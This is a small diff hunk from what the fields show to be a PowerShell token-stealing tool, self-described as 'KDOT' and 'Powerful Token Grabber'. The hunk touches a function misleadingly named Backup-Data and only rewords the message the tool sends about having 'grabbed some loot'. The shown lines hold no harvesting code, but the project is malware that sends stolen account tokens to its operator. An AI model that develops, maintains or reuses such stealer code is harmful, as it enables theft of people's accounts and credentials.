@@ -660,7 +660,7 @@ function Backup-Data {
 
     $embed_and_body = @{
         "username" = "POWER"
-        "content" = "Haiii I grabbed some loot :3"
+        "content" = "Haiii I just grabbed some loot :3"
         "title" = "KDOT"
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
